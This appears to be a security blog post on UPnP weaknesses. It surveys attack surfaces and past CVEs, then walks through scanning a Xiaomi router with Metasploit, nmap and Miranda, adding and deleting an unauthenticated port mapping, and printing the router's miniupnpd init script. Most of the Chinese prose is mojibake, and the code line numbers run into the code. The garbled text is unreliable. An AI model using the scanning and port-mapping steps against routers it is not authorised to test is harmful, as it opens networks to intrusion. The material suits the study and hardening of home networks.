ç‰ˆæœ¬ä¿¡æ¯upnp.org specé€šå¸¸ä¸º1.0 è®¾å¤‡å®šä¹‰å‹å·åå’Œç¼–å·ã€åºåˆ—å·ã€å‚å•†åã€å“ç‰Œç›¸å…³URLæœåŠ¡åˆ—è¡¨ï¼šæœåŠ¡ç±»å‹ï¼›SCPD URLï¼›Control URLï¼›Event URLUPnP â€“ SCPD å®šä¹‰æœåŠ¡åŠ¨ä½œå’Œå‚æ•°çš„XMLæ–‡ä»¶ ç‰ˆæœ¬ä¿¡æ¯å’Œæè¿°ä¸€è‡´ åŠ¨ä½œåˆ—è¡¨åŠ¨ä½œåå‚æ•°ï¼šå‚æ•°åã€æ–¹å‘ï¼ˆè¾“å…¥è¾“å‡ºï¼‰ã€å˜é‡å å˜é‡åˆ—è¡¨å˜é‡åã€æ•°æ®ç±»å‹UPnP â€“ Control è¿™é‡Œç”¨åˆ°äº†SOAP ä¸»è¦æ˜¯RPCæœåŠ¡æˆ–CGIè„šæœ¬çš„å‰ç«¯ SOAPå°è£…â€¢ XMLæ ¼å¼çš„APIè°ƒç”¨â€¢ æè¿°XMLä¸­çš„æœåŠ¡ç±»å‹â€¢ æ¥è‡ªSCPD XMLçš„åŠ¨ä½œåç§°å’Œå‚æ•° POSTå°è£…åˆ°control URLTL;DRå¥½çš„ä¸€é¢ Control AV equipment Home automation Network administration Physical security systems (ok, easy there buddy) Industrial monitoring and control (uhâ€¦what?) And this is just the official specsAll our devices can talk to each other! Brave new worlds of remote control and automation! Have your toaster turn on the lights, set the TV to the news channel, and send you a text message when breakfast is ready! The future is now! Nothing could possibly go wrong!å…³äºå®‰å…¨ åµŒå…¥å¼è®¾å¤‡ æœ‰é™çš„å†…å­˜å’Œå¤„ç†èƒ½åŠ› ç¡¬ä»¶å’Œè½¯ä»¶å¼€å‘äººå‘˜é€šå¸¸æ˜¯å®Œå…¨ä¸åŒçš„å…¬å¸ å¤åˆ¶å’Œç²˜è´´å¼€å‘ ä¿æŒä½æˆæœ¬ ä¸å®Œå…¨å…³å¿ƒ/æ‡‚è¡Œ éƒ¨ç½² æ•°ä»¥ç™¾ä¸‡è®¡çš„é¢å‘äº’è”ç½‘çš„UPnPè®¾å¤‡ è¦è®¡ç®—çš„ä¾›åº”å•†å¤ªå¤š å‰ç«¯æ˜¯æ ‡å‡†åŒ–çš„ï¼Œåç«¯ç”šè‡³åœ¨åŒä¸€ä¾›åº”å•†å†…ä¹Ÿæœ‰æ‰€ä¸åŒ éš¾ä»¥ä¿®è¡¥/æ›´æ–°å›ºä»¶ ä»…ä»…å› ä¸ºä½ å¯ä»¥ï¼Œå¹¶ä¸æ„å‘³ç€ä½ åº”è¯¥ XMLè§£æå¾ˆéš¾ éœ€è¦å¤§é‡ç³»ç»Ÿèµ„æº è‡ªç”±æ ¼å¼çš„ç”¨æˆ·æä¾›çš„æ•°æ® 2013å¹´ï¼Œ2.5ï¼…çš„CVEä¸XMLç›¸å…³[2]ï¼Œå…¶ä¸­ï¼Œè¿‘36ï¼…çš„æ‚£è€…CVSSä¸¥é‡ç¨‹åº¦ä¸º7æˆ–ä»¥ä¸Š éšç€XMLçš„ç”¨ä¾‹å¢é•¿ï¼Œç‰ˆæœ¬ä¹Ÿè¶Šæ¥è¶Šå¤šï¼šé€’å½’é”™è¯¯ï¼ŒXXEï¼Œå‘½ä»¤æ³¨å…¥ç­‰â€¦â€¦ æ”»å‡»é¢ UPnPæœåŠ¡â€¢ HTTPå¤´è§£æâ€¢ SSDPè§£æâ€¢ OSå‘½ä»¤æ³¨å…¥â€¢ ä¿¡æ¯æŠ«éœ² SOAPæœåŠ¡â€¢ HTTPå¤´è§£æâ€¢ XMLè§£æâ€¢ æ³¨å°„ç”¨å“â€¢ OSå‘½ä»¤â€¢ SQLæ³¨å…¥â€¢ SOAPæ³¨å…¥â€¢ ä¿¡æ¯æŠ«éœ²â€¢ å¯ç–‘çº§åˆ«çš„æœªç»èº«ä»½éªŒè¯çš„è®¾å¤‡æ§åˆ¶Attack surface â€“ UPnP CVE-2012-5958å»å¹´ç”±HD Mooreï¼ˆä¼—å¤šä¹‹ä¸€ï¼‰æŠ«éœ²ï¼›è°ƒç”¨strncpyå°†STå¤´ä¸­çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°TempBuf[COMMAND_LEN]ï¼›strncpyçš„é•¿åº¦å‚æ•°åŸºäºå†’å·ä¹‹é—´çš„å­—ç¬¦æ•° D-Link DIR-815 UPnPå‘½ä»¤æ³¨å…¥å»å¹´ç”±Zach CutlipæŠ«éœ²;STå¤´çš„å†…å®¹ä½œä¸ºå‚æ•°ä¼ é€’ç»™M-SEARCH.sh;æ— éœ€éªŒè¯ Attack surface â€“ SOAP XBMC soap_action_nameç¼“å†²åŒºæº¢å‡ºç”±n00bäº2010å¹´10æœˆå…¬å¸ƒ;ProcessHttpPostRequestå‡½æ•°åˆ†é…é™æ€å¤§å°çš„ç¼“å†²åŒº;è°ƒç”¨sscanfå°†SOAPActionæ ‡å¤´çš„å€¼å¤åˆ¶åˆ°å…¶ä¸­ï¼Œæ²¡æœ‰è¾¹ç•Œæ£€æŸ¥ åšé€šSetConnectionTypeæ ¼å¼å­—ç¬¦ä¸²æ¼æ´å»å¹´Leon Juranicå’ŒVedran Kajicé€éœ²ï¼›SetConnectionTypeæ“ä½œå°†NewConnectionTypeå‚æ•°çš„å€¼æä¾›ç»™snprintfï¼›ä¸å¯¹ç”¨æˆ·æ§åˆ¶çš„å€¼è¿›è¡Œæ£€æŸ¥ CVE-2014-3242ä»Šå¹´æ—©äº›æ—¶å€™ç”±pnig0sæŠ«éœ²;SOAPpyå…è®¸åœ¨SOAPè¯·æ±‚ä¸­å£°æ˜ç”¨æˆ·å®šä¹‰çš„XMLå¤–éƒ¨å®ä½“;ä¸å¯¹ç”¨æˆ·æ§åˆ¶çš„å€¼è¿›è¡Œæ£€æŸ¥ CVE-2014-2928Brandon Perryä»Šå¹´æ—©äº›æ—¶å€™å…¬å¸ƒäº†ï¼ˆPBerry Crunchï¼ï¼‰;F5 iControl API set_hostnameæ“ä½œå°†hostnameå‚æ•°çš„å€¼ä¼ é€’ç»™shell;å†ä¸€æ¬¡ï¼Œä¸å¯¹ç”¨æˆ·æ§åˆ¶çš„å€¼è¿›è¡Œæ¶ˆæ¯’ CVE-2011-4499ï¼ŒCVE-2011-4500ï¼ŒCVE-2011-4501ï¼ŒCVE-2011-4503ï¼ŒCVE-2011-4504ï¼ŒCVE-2011-4505ï¼ŒCVE-2011-4506ï¼Œæ›´å¤šï¼ŸDaniel Garciaåœ¨Defcon 19ä¸ŠæŠ«éœ²; UPnP IGD ä½¿ç”¨AddPortMappingå’ŒDeletePortMappingç­‰æ“ä½œæ¥å…è®¸è¿œç¨‹ç®¡ç†è·¯ç”±è§„åˆ™;ç¼ºä¹èº«ä»½éªŒè¯ï¼Œå¯åœ¨WANæ¥å£ä¸Šä½¿ç”¨; ä½¿æ”»å‡»è€…èƒ½å¤Ÿæ‰§è¡Œï¼šâ€¢NATéå† â€¢å¤–éƒ¨/å†…éƒ¨ä¸»æœºç«¯å£æ˜ å°„ â€¢å†…éƒ¨LANçš„å¤–éƒ¨ç½‘ç»œæ‰«æ å¦‚ä½•æµ‹è¯• äº†è§£æ‚¨çš„ç½‘ç»œM-SEARCHä½ è¿æ¥çš„æ¯ä¸ªç½‘ç»œä»¥ç›‘å¬æ–°çš„NOTIFYæ¶ˆæ¯ å¦‚æœæ‚¨ä¸éœ€è¦UPnPï¼Œè¯·å°†å…¶ç¦ç”¨å¦‚æœä¸åœ¨è®¾å¤‡ä¸Šï¼Œåˆ™åœ¨è·¯ç”±å™¨ä¸Š éšæ—¶æŒæ¡å›ºä»¶æ›´æ–°å¹¶éæ€»æ˜¯è‡ªåŠ¨çš„ æ¨¡ç³Šæµ‹è¯•Burp â€“ http://portswigger.net/burp/WSFuzzer â€“ https://www.owasp.org/index.php/Category:OWASP_WSFuzzer_ProjectMiranda â€“ http://code.google.com/p/miranda-upnp/ å¯¹å°ç±³WIFIè·¯ç”±å™¨çš„UPnPåˆ†æä½¿ç”¨å·¥å…·æ‰«æä½¿ç”¨Metasploitæ£€æŸ¥12345678910msfconsolemsf5 &gt; use auxiliary/scanner/upnp/ssdp_msearchmsf5 auxiliary(scanner/upnp/ssdp_msearch) &gt; set RHOSTS 192.168.31.0/24RHOSTS =&gt; 192.168.31.0/24msf5 auxiliary(scanner/upnp/ssdp_msearch) &gt; run[*] Sending UPnP SSDP probes to 192.168.31.0-&gt;192.168.31.255 (256 hosts)[*] 192.168.31.1:1900 SSDP MiWiFi/x UPnP/1.1 MiniUPnPd/2.0 | http://192.168.31.1:5351/rootDesc.xml | uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8c::upnp:rootdevice[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed ä»ä¸­å¯ä»¥å¾—åˆ°è¿™äº›ä¿¡æ¯ï¼š UPnP/1.1 MiniUPnPd/2.0 ä½¿ç”¨nmapè¿›è¡Œæ‰«æ12345nmap -p1900ï¼Œ5351 192.168.31.1PORT STATE SERVICE1900/tcp filtered upnp5351/tcp open nat-pmp nat-pmpNATç«¯å£æ˜ å°„åè®®ï¼ˆè‹±è¯­ï¼šNAT Port Mapping Protocolï¼Œç¼©å†™NAT-PMPï¼‰æ˜¯ä¸€ä¸ªèƒ½è‡ªåŠ¨åˆ›å»ºç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰è®¾ç½®å’Œç«¯å£æ˜ å°„é…ç½®è€Œæ— éœ€ç”¨æˆ·ä»‹å…¥çš„ç½‘ç»œåè®®ã€‚è¯¥åè®®èƒ½è‡ªåŠ¨æµ‹å®šNATç½‘å…³çš„å¤–éƒ¨IPv4åœ°å€ï¼Œå¹¶ä¸ºåº”ç”¨ç¨‹åºæä¾›ä¸å¯¹ç­‰ç«¯äº¤æµé€šä¿¡çš„æ–¹æ³•ã€‚NAT-PMPäº2005å¹´ç”±è‹¹æœå…¬å¸æ¨å‡ºï¼Œä¸ºæ›´å¸¸è§çš„ISOæ ‡å‡†äº’è”ç½‘ç½‘å…³è®¾å¤‡åè®®ï¼ˆè¢«è®¸å¤šNATè·¯ç”±å™¨å®ç°ï¼‰çš„ä¸€ä¸ªæ›¿ä»£å“ã€‚è¯¥åè®®ç”±äº’è”ç½‘å·¥ç¨‹ä»»åŠ¡ç»„ï¼ˆIETFï¼‰åœ¨RFC 6886ä¸­å‘å¸ƒã€‚NAT-PMPä½¿ç”¨ç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼ˆUDPï¼‰ï¼Œåœ¨5351ç«¯å£è¿è¡Œã€‚è¯¥åè®®æ²¡æœ‰å†…ç½®çš„èº«ä»½éªŒè¯æœºåˆ¶ï¼Œå› ä¸ºè½¬å‘ä¸€ä¸ªç«¯å£é€šå¸¸ä¸å…è®¸ä»»ä½•æ´»åŠ¨ï¼Œä¹Ÿä¸èƒ½ç”¨STUNæ–¹æ³•å®ç°ã€‚NAT-PMPç›¸æ¯”STUNçš„å¥½å¤„æ˜¯å®ƒä¸éœ€è¦STUNæœåŠ¡å™¨ï¼Œå¹¶ä¸”NAT-PMPæ˜ å°„æœ‰ä¸€ä¸ªå·²çŸ¥çš„è¿‡æœŸæ—¶é—´ï¼Œåº”ç”¨å¯ä»¥é¿å…ä½æ•ˆåœ°å‘é€ä¿æ´»æ•°æ®åŒ…ã€‚NAT-PMPæ˜¯ç«¯å£æ§åˆ¶åè®®ï¼ˆPCPï¼‰çš„å‰èº«ã€‚https://laucyun.com/25118b151a3386b7beff250835fe7e98.html2014å¹´10æœˆï¼ŒRapid7å®‰å…¨ç ”ç©¶å‘˜Jon Hartå…¬å¸ƒï¼Œå› å‚å•†å¯¹NAT-PMPåè®®è®¾è®¡ä¸å½“ï¼Œä¼°è®¡å…¬ç½‘ä¸Šæœ‰1200ä¸‡å°ç½‘ç»œè®¾å¤‡å—åˆ°NAT-PMPæ¼æ´çš„å½±å“ã€‚NAT-PMPåè®®çš„è§„èŒƒä¸­ç‰¹åˆ«æŒ‡æ˜ï¼ŒNATç½‘å…³ä¸èƒ½æ¥å—æ¥è‡ªå¤–ç½‘çš„åœ°å€æ˜ å°„è¯·æ±‚ï¼Œä½†ä¸€äº›å‚å•†çš„è®¾è®¡å¹¶æœªéµå®ˆæ­¤è§„å®šã€‚é»‘å®¢å¯èƒ½å¯¹è¿™äº›è®¾å¤‡è¿›è¡Œæ¶æ„çš„ç«¯å£æ˜ å°„ï¼Œè¿›è¡Œæµé‡åå¼¹ã€ä»£ç†ç­‰æ”»å‡»ã€‚ netstatæ‰«æ1234Proto Recv-Q Send-Q Local Address Foreign Address State in out PID/Program nametcp 0 0 :::5351 :::* LISTEN 0 0 18068/miniupnpdudp 0 0 192.168.31.1:5351 0.0.0.0:* 0 0 18068/miniupnpdudp 0 0 0.0.0.0:1900 0.0.0.0:* 1414113 1827652 18068/miniupnpd ç«¯å£1900åœ¨UPnPå‘ç°çš„è¿‡ç¨‹ä¸­ä½¿ç”¨ï¼Œ5351é€šå¸¸ä¸ºç«¯å£æ˜ å°„åè®®NAT-PMPè¿è¡Œçš„ç«¯å£ miranda123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144sudo python2 miranda.py -i wlx44334c388fbd -vMiranda v1.3The interactive UPnP clientCraig Heffner, http://www.devttys0.comBinding to interface wlx44334c388fbd ...Verbose mode enabled!upnp&gt; msearchEntering discovery mode for &apos;upnp:rootdevice&apos;, Ctl+C to stop...****************************************************************SSDP reply message from 192.168.31.1:5351XML file is located at http://192.168.31.1:5351/rootDesc.xmlDevice is running MiWiFi/x UPnP/1.1 MiniUPnPd/2.0****************************************************************upnp&gt; host get 0Requesting device and service info for 192.168.31.1:5351 (this could take a few seconds)...Device urn:schemas-upnp-org:device:WANDevice:1 does not have a presentationURLDevice urn:schemas-upnp-org:device:WANConnectionDevice:1 does not have a presentationURLHost data enumeration complete!upnp&gt; host list [0] 192.168.31.1:5351upnp&gt; host info 0xmlFile : http://192.168.31.1:5351/rootDesc.xmlname : 192.168.31.1:5351proto : http://serverType : MiWiFi/x UPnP/1.1 MiniUPnPd/2.0upnpServer : MiWiFi/x UPnP/1.1 MiniUPnPd/2.0dataComplete : TruedeviceList : &#123;&#125;upnp&gt; host info 0 deviceListInternetGatewayDevice : &#123;&#125;WANDevice : &#123;&#125;WANConnectionDevice : &#123;&#125;upnp&gt; host info 0 deviceList WANConnectionDevice manufacturerURL : http://miniupnp.free.fr/ modelName : MiniUPnPd UPC : 000000000000 modelNumber : 20180830 friendlyName : WANConnectionDevice fullName : urn:schemas-upnp-org:device:WANConnectionDevice:1 modelDescription : MiniUPnP daemon UDN : uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8e modelURL : http://miniupnp.free.fr/ manufacturer : MiniUPnP services : &#123;&#125;upnp&gt; host info 0 deviceList WANConnectionDevice services WANIPConnection eventSubURL : /evt/IPConn controlURL : /ctl/IPConn serviceId : urn:upnp-org:serviceId:WANIPConn1 SCPDURL : /WANIPCn.xml fullName : urn:schemas-upnp-org:service:WANIPConnection:1 actions : &#123;&#125; serviceStateVariables : &#123;&#125;upnp&gt; host info 0 deviceList WANConnectionDevice services WANIPConnection actions AddPortMapping : &#123;&#125; GetNATRSIPStatus : &#123;&#125; GetGenericPortMappingEntry : &#123;&#125; GetSpecificPortMappingEntry : &#123;&#125; ForceTermination : &#123;&#125; GetExternalIPAddress : &#123;&#125; GetConnectionTypeInfo : &#123;&#125; GetStatusInfo : &#123;&#125; SetConnectionType : &#123;&#125; DeletePortMapping : &#123;&#125; RequestConnection : &#123;&#125;upnp&gt; host info 0 deviceList WANConnectionDevice services WANIPConnection serviceStateVariables InternalClient : &#123;&#125; Uptime : &#123;&#125; PortMappingLeaseDuration : &#123;&#125; PortMappingDescription : &#123;&#125; RemoteHost : &#123;&#125; PossibleConnectionTypes : &#123;&#125; ExternalPort : &#123;&#125; RSIPAvailable : &#123;&#125; ConnectionStatus : &#123;&#125; PortMappingNumberOfEntries : &#123;&#125; ExternalIPAddress : &#123;&#125; ConnectionType : &#123;&#125; NATEnabled : &#123;&#125; LastConnectionError : &#123;&#125; InternalPort : &#123;&#125; PortMappingProtocol : &#123;&#125; PortMappingEnabled : &#123;&#125;upnp&gt; host summary 0 Host: 192.168.31.1:5351 XML File: http://192.168.31.1:5351/rootDesc.xml InternetGatewayDevice manufacturerURL: http://www.mi.com modelName: MiWiFi Router UPC: 000000000000 modelNumber: 20180830 presentationURL: http://miwifi.com/ friendlyName: MiWiFi router fullName: urn:schemas-upnp-org:device:InternetGatewayDevice:1 modelDescription: MiWiFi Router UDN: uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8c modelURL: http://www1.miwifi.com manufacturer: Xiaomi WANDevice manufacturerURL: http://miniupnp.free.fr/ modelName: WAN Device UPC: 000000000000 modelNumber: 20180830 friendlyName: WANDevice fullName: urn:schemas-upnp-org:device:WANDevice:1 modelDescription: WAN Device UDN: uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8d modelURL: http://miniupnp.free.fr/ manufacturer: MiniUPnP WANConnectionDevice manufacturerURL: http://miniupnp.free.fr/ modelName: MiniUPnPd UPC: 000000000000 modelNumber: 20180830 friendlyName: WANConnectionDevice fullName: urn:schemas-upnp-org:device:WANConnectionDevice:1 modelDescription: MiniUPnP daemon UDN: uuid:f3539dd5-8dc5-420c-9070-c6f66d27fc8e modelURL: http://miniupnp.free.fr/ manufacturer: MiniUPnP ä½¿ç”¨mirandaå‘é€UPnPå‘½ä»¤è·å–å¤–éƒ¨IPåœ°å€ 123upnp&gt; host send 0 WANConnectionDevice WANIPConnection GetExternalIPAddressNewExternalIPAddress : 172.16.173.231 å¢åŠ ä¸€ä¸ªç«¯å£æ˜ å°„ï¼Œå°†è·¯ç”±å™¨ä¸Šç«¯å£ä¸º1900çš„æœåŠ¡æ˜ å°„åˆ°å¤–ç½‘ç«¯å£8080 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253upnp&gt; host send 0 WANConnectionDevice WANIPConnection AddPortMappingRequired argument: Argument Name: NewPortMappingDescription Data Type: string Allowed Values: [] Set NewPortMappingDescription value to: HACKRequired argument: Argument Name: NewLeaseDuration Data Type: ui4 Allowed Values: [] Value Min: 0 Value Max: 604800 Set NewLeaseDuration value to: 0Required argument: Argument Name: NewInternalClient Data Type: string Allowed Values: [] Set NewInternalClient value to: 192.168.31.1Required argument: Argument Name: NewEnabled Data Type: boolean Allowed Values: [] Set NewEnabled value to: 1Required argument: Argument Name: NewExternalPort Data Type: ui2 Allowed Values: [] Set NewExternalPort value to: 8080Required argument: Argument Name: NewRemoteHost Data Type: string Allowed Values: [] Set NewRemoteHost value to:Required argument: Argument Name: NewProtocol Data Type: string Allowed Values: [&apos;TCP&apos;, &apos;UDP&apos;] Set NewProtocol value to: TCPRequired argument: Argument Name: NewInternalPort Data Type: ui2 Allowed Values: [] Value Min: 1 Value Max: 65535 Set NewInternalPort value to: 1900 12345678910111213141516171819202122232425upnp&gt; host send 0 WANConnectionDevice WANIPConnection GetSpecificPortMappingEntry Required argument: Argument Name: NewExternalPort Data Type: ui2 Allowed Values: [] Set NewExternalPort value to: 8080 Required argument: Argument Name: NewRemoteHost Data Type: string Allowed Values: [] Set NewRemoteHost value to: Required argument: Argument Name: NewProtocol Data Type: string Allowed Values: [&apos;TCP&apos;, &apos;UDP&apos;] Set NewProtocol value to: TCP NewPortMappingDescription : HACK NewLeaseDuration : 0 NewInternalClient : 192.168.31.1 NewEnabled : 1 NewInternalPort : 1900 å¯ä»¥æ— éœ€éªŒè¯åœ°åˆ é™¤æ˜ å°„1upnp&gt; host send 0 WANConnectionDevice WANIPConnection DeletePortMapping è™½ç„¶UPnPæ˜¯ä¸€ç§å¾ˆå°‘ç†è§£çš„åè®®ï¼Œä½†å®ƒåœ¨ç»å¤§å¤šæ•°å®¶åº­ç½‘ç»œä¸Šéƒ½å¾ˆæ´»è·ƒï¼Œç”šè‡³åœ¨æŸäº›å…¬å¸ç½‘ç»œä¸Šä¹Ÿæ˜¯å¦‚æ­¤ã€‚è®¸å¤šè®¾å¤‡æ”¯æŒUPnPä»¥ä¾¿äºæ¶ˆè´¹è€…ä½¿ç”¨ï¼Œä½†æ˜¯ï¼Œå®ƒä»¬é€šå¸¸æ”¯æŒä¸å…è®¸ä»»ä½•æœåŠ¡è‡ªåŠ¨æ‰§è¡Œçš„æ“ä½œï¼Œå°¤å…¶æ˜¯æœªç»æˆæƒçš„æƒ…å†µä¸‹ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œåè®®å®ç°æœ¬èº«å¾ˆå°‘ä»¥å®‰å…¨æ€ç»´æ„å»ºï¼Œä½¿å…¶å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨ã€‚é˜²æ­¢æœ¬åœ°/è¿œç¨‹åˆ©ç”¨UPnPçš„æœ€ä½³æ–¹æ³•æ˜¯åœ¨ä»»ä½•/æ‰€æœ‰ç½‘ç»œè®¾å¤‡ä¸Šç¦ç”¨è¯¥åŠŸèƒ½ã€‚ç„¶è€Œï¼Œè€ƒè™‘åˆ°è¿™ä¸ªåè®®å’Œå…¶ä»–â€œè‡ªåŠ¨é­”æœ¯â€åè®®æ—¨åœ¨å¸®åŠ©æ‡’æƒ°çš„ç”¨æˆ·ï¼Œä»–ä»¬å¯èƒ½ä¸çŸ¥é“è¿™äº›åè®®çš„å±é™©ï¼Œå”¯ä¸€çœŸæ­£çš„è§£å†³æ–¹æ¡ˆæ˜¯è®©ä¾›åº”å•†æ›´åŠ å…³æ³¨ä»–ä»¬çš„è®¾è®¡å’Œå®æ–½ï¼Œå¹¶ä¸”æ›´åŠ å®‰å…¨ã€‚ æµè§ˆé…ç½®æ–‡ä»¶é€šè¿‡findå‘½ä»¤æœç´¢root@XiaoQiang:/# find -name *upnp* ./etc/rc.d/S95miniupnpd ./etc/init.d/miniupnpd ./etc/hotplug.d/iface/50-miniupnpd ./etc/config/upnpd ./tmp/upnp.leases ./tmp/etc/miniupnpd.conf ./tmp/run/miniupnpd.pid ./usr/lib/lua/luci/view/web/setting/upnp.htm ./usr/sbin/miniupnpd ./usr/share/miniupnpd ./www/xiaoqiang/web/css/upnp.css ./data/etc/rc.d/S95miniupnpd ./data/etc/init.d/miniupnpd ./data/etc/hotplug.d/iface/50-miniupnpd ./data/etc/config/upnpd /etc/rc.d å¯åŠ¨çš„é…ç½®æ–‡ä»¶å’Œè„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179!/bin/sh /etc/rc.common# Copyright (C) 2006-2011 OpenWrt.orgSTART=95SERVICE_USE_PID=1upnpd_get_port_range() &#123; local _var=&quot;$1&quot;; shift local _val config_get _val &quot;$@&quot; case &quot;$_val&quot; in [0-9]*[:-][0-9]*) export -n -- &quot;$&#123;_var&#125;_start=$&#123;_val%%[:-]*&#125;&quot; export -n -- &quot;$&#123;_var&#125;_end=$&#123;_val##*[:-]&#125;&quot; ;; [0-9]*) export -n -- &quot;$&#123;_var&#125;_start=$_val&quot; export -n -- &quot;$&#123;_var&#125;_end=&quot; ;; esac&#125;conf_rule_add() &#123; local cfg=&quot;$1&quot; local tmpconf=&quot;$2&quot; local action external_port_start external_port_end int_addr local internal_port_start internal_port_end config_get action &quot;$cfg&quot; action &quot;deny&quot; # allow or deny upnpd_get_port_range &quot;ext&quot; &quot;$cfg&quot; ext_ports &quot;0-65535&quot; # external ports: x, x-y, x:y config_get int_addr &quot;$cfg&quot; int_addr &quot;0.0.0.0/0&quot; # ip or network and subnet mask (internal) upnpd_get_port_range &quot;int&quot; &quot;$cfg&quot; int_ports &quot;0-65535&quot; # internal ports: x, x-y, x:y or range # Make a single IP IP/32 so that miniupnpd.conf can use it. case &quot;$int_addr&quot; in */*) ;; *) int_addr=&quot;$int_addr/32&quot; ;; esac echo &quot;$&#123;action&#125; $&#123;ext_start&#125;$&#123;ext_end:+-&#125;$&#123;ext_end&#125; $&#123;int_addr&#125; $&#123;int_start&#125;$&#123;int_end:+-&#125;$&#123;int_end&#125;&quot; &gt;&gt;$tmpconf&#125;upnpd_write_bool() &#123; local opt=&quot;$1&quot; local def=&quot;$&#123;2:-0&#125;&quot; local alt=&quot;$3&quot; local val config_get_bool val config &quot;$opt&quot; &quot;$def&quot; if [ &quot;$val&quot; -eq 0 ]; then echo &quot;$&#123;alt:-$opt&#125;=no&quot; &gt;&gt; $tmpconf else echo &quot;$&#123;alt:-$opt&#125;=yes&quot; &gt;&gt; $tmpconf fi &#125; boot() &#123; return 0 &#125; start() &#123; config_load &quot;upnpd&quot; local extiface intiface upload download logging secure enabled natpmp local extip port usesysuptime conffile serial_number model_number local uuid notify_interval presentation_url enable_upnp local upnp_lease_file clean_ruleset_threshold clean_ruleset_interval config_get extiface config external_iface config_get intiface config internal_iface config_get extip config external_ip config_get port config port 5000 config_get upload config upload config_get download config download config_get_bool logging config log_output 0 config_get conffile config config_file config_get serial_number config serial_number config_get model_number config model_number config_get uuid config uuid config_get notify_interval config notify_interval config_get presentation_url config presentation_url config_get upnp_lease_file config upnp_lease_file config_get clean_ruleset_threshold config clean_ruleset_threshold config_get clean_ruleset_interval config clean_ruleset_interval local args . /lib/functions/network.sh local ifname network_get_device ifname $&#123;extiface:-wan&#125; if [ -n &quot;$conffile&quot; ]; then args=&quot;-f $conffile&quot; else local tmpconf=&quot;/var/etc/miniupnpd.conf&quot; args=&quot;-f $tmpconf&quot; mkdir -p /var/etc echo &quot;ext_ifname=$ifname&quot; &gt;$tmpconf [ -n &quot;$extip&quot; ] &amp;&amp; \\ echo &quot;ext_ip=$extip&quot; &gt;&gt;$tmpconf local iface for iface in $&#123;intiface:-lan&#125;; do local device network_get_device device &quot;$iface&quot; &amp;&amp; &#123; echo &quot;listening_ip=$device&quot; &gt;&gt;$tmpconf &#125; done [ &quot;$port&quot; != &quot;auto&quot; ] &amp;&amp; \\ echo &quot;port=$port&quot; &gt;&gt;$tmpconf config_load &quot;upnpd&quot; upnpd_write_bool enable_natpmp 1 upnpd_write_bool enable_upnp 1 upnpd_write_bool secure_mode 1 upnpd_write_bool system_uptime 1 [ -n &quot;$upnp_lease_file&quot; ] &amp;&amp; &#123; touch $upnp_lease_file echo &quot;lease_file=$upnp_lease_file&quot; &gt;&gt;$tmpconf &#125; [ -n &quot;$upload&quot; -a -n &quot;$download&quot; ] &amp;&amp; &#123; echo &quot;bitrate_down=$(($download * 1024 * 8))&quot; &gt;&gt;$tmpconf echo &quot;bitrate_up=$(($upload * 1024 * 8))&quot; &gt;&gt;$tmpconf &#125; [ -n &quot;$&#123;presentation_url&#125;&quot; ] &amp;&amp; \\ echo &quot;presentation_url=$&#123;presentation_url&#125;&quot; &gt;&gt;$tmpconf [ -n &quot;$&#123;notify_interval&#125;&quot; ] &amp;&amp; \\ echo &quot;notify_interval=$&#123;notify_interval&#125;&quot; &gt;&gt;$tmpconf [ -n &quot;$&#123;clean_ruleset_threshold&#125;&quot; ] &amp;&amp; \\ echo &quot;clean_ruleset_threshold=$&#123;clean_ruleset_threshold&#125;&quot; &gt;&gt;$tmpconf [ -n &quot;$&#123;clean_ruleset_interval&#125;&quot; ] &amp;&amp; \\ echo &quot;clean_ruleset_interval=$&#123;clean_ruleset_interval&#125;&quot; &gt;&gt;$tmpconf [ -z &quot;$uuid&quot; ] &amp;&amp; &#123; uuid=&quot;$(cat /proc/sys/kernel/random/uuid)&quot; uci set upnpd.config.uuid=$uuid uci commit upnpd &#125; [ &quot;$uuid&quot; = &quot;nocli&quot; ] || \\ echo &quot;uuid=$uuid&quot; &gt;&gt;$tmpconf [ -n &quot;$&#123;serial_number&#125;&quot; ] &amp;&amp; \\ echo &quot;serial=$&#123;serial_number&#125;&quot; &gt;&gt;$tmpconf [ -n &quot;$&#123;model_number&#125;&quot; ] &amp;&amp; \\ echo &quot;model_number=$&#123;model_number&#125;&quot; &gt;&gt;$tmpconf config_foreach conf_rule_add perm_rule &quot;$tmpconf&quot; fi if [ -n &quot;$ifname&quot; ]; then # start firewall iptables -L MINIUPNPD &gt;/dev/null 2&gt;/dev/null || fw3 reload if [ &quot;$logging&quot; = &quot;1&quot; ]; then SERVICE_DAEMONIZE=1 \\ service_start /usr/sbin/miniupnpd $args -d else SERVICE_DAEMONIZE= \\ service_start /usr/sbin/miniupnpd $args fi else logger -t &quot;upnp daemon&quot; &quot;external interface not found, not starting&quot; fi return 0 &#125; stop() &#123; service_stop /usr/sbin/miniupnpd iptables -t nat -F MINIUPNPD 2&gt;/dev/null iptables -t filter -F MINIUPNPD 2&gt;/dev/null return 0 &#125; 